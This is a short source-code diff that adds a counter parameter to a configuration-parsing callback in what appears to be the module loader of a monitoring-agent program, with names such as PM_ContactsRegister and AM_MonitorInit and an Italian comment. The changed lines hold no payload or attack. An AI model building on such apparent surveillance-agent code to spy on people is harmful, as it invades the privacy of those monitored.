@@ -49,7 +49,7 @@ extern void PM_ApplicationRegister();
 extern void PM_PDAAgentRegister();
 extern void PM_ContactsRegister();
 
-typedef void (WINAPI *conf_callback_t)(JSONObject);
+typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
 extern BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back);
 void AM_SuspendRestart(DWORD);
 
@@ -428,7 +428,7 @@ DWORD AM_Startup()
 
 
 // Legge la configurazione degli agent da file
-void WINAPI ParseModules(JSONObject module)
+void WINAPI ParseModules(JSONObject module, DWORD dummy)
 {
 	AM_MonitorInit(AM_GetAgentTag(module[L"module"]->AsString().c_str()), module);	
 }
